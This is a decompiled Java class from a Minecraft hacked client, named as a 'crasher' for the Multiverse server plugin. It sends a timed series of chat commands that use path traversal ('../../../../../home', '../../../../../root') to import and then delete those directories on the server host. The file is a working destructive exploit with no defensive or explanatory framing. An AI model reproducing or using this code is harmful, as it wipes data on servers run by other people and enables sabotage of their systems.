// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.mvc;

import java.util.concurrent.CompletableFuture;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.client.Minecraft;

public class MultiVerseCrasher1
{
    public static void start() {
        CompletableFuture.runAsync(() -> {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/mv import ../../../../../home normal -t flat"));
            try {
                Thread.sleep(500L);
            }
            catch (final InterruptedException ex) {}
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/mv import ../../../../../root normal -t flat"));
            try {
                Thread.sleep(500L);
            }
            catch (final InterruptedException ex2) {}
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/mv delete ../../../../../home"));
            try {
                Thread.sleep(500L);
            }
            catch (final InterruptedException ex3) {}
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/mv confirm"));
            try {
                Thread.sleep(500L);
            }
            catch (final InterruptedException ex4) {}
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/mv delete ../../../../../root"));
            try {
                Thread.sleep(500L);
            }
            catch (final InterruptedException ex5) {}
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/mv confirm"));
        });
    }
}
